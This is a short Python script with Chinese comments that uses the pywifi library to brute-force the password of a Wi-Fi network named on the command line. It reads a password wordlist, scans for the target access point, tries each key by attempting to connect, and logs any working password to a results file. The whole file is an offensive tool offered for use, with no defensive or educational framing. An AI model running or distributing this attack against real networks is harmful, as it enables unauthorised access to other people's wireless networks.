import pywifi
from pywifi import const  # 引用一些定义

from _util import *

def main(ssid):

    print('[+]获取网卡')
    wifi = pywifi.PyWiFi()  # 抓取网卡接口
    iface = wifi.interfaces()[0]  # 获取网卡，对于wifi连接服务，默认为0号网卡
    print('[-]成功获取网卡')

    if ssid in [profile.ssid for profile in iface.network_profiles()]:
        print('[*]此(SSID:%s)已经存在电脑中'%ssid)
        return
    
    print('[+]导入密码本')
    passwords = []
    with open('password.txt') as f:
        for line in f:
            passwords.append(line.strip())
    print('[-]成功导入密码本')

    print('[+]扫描热点')
    for profile in get_aps(iface):
        if profile.ssid == ssid:
            break
    else:
        print('[!]%s不在当前区域'%ssid)
        return
    print('[-]完成扫描')


    print('[+]开始破解SSID:', ssid)

    profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元 /cipher - AP的密码类型

    for key in passwords:
        print('[+]使用密码 %s 破解 %s' % (key, ssid))

        profile.key = key

        if crack_ap(iface, profile):
            with open('crack_result.txt', 'a') as f:
                f.write('%s : %s\n' % (ssid, key))
            print('[-]使用密码 %s 破解 %s成功' % (key, ssid))
            break
        else:
            print('[-]使用密码 %s 破解 %s失败' % (key, ssid))

    print('[-]结束破解SSID:', profile.ssid)


def __main__():
    import argparse

    parser = argparse.ArgumentParser(description='暴力破解指定SSID的热点')
    parser.add_argument('ssid', type=str, help='SSID 名称')
    args = parser.parse_args()

    main(args.ssid)

if __name__ == '__main__':
    __main__()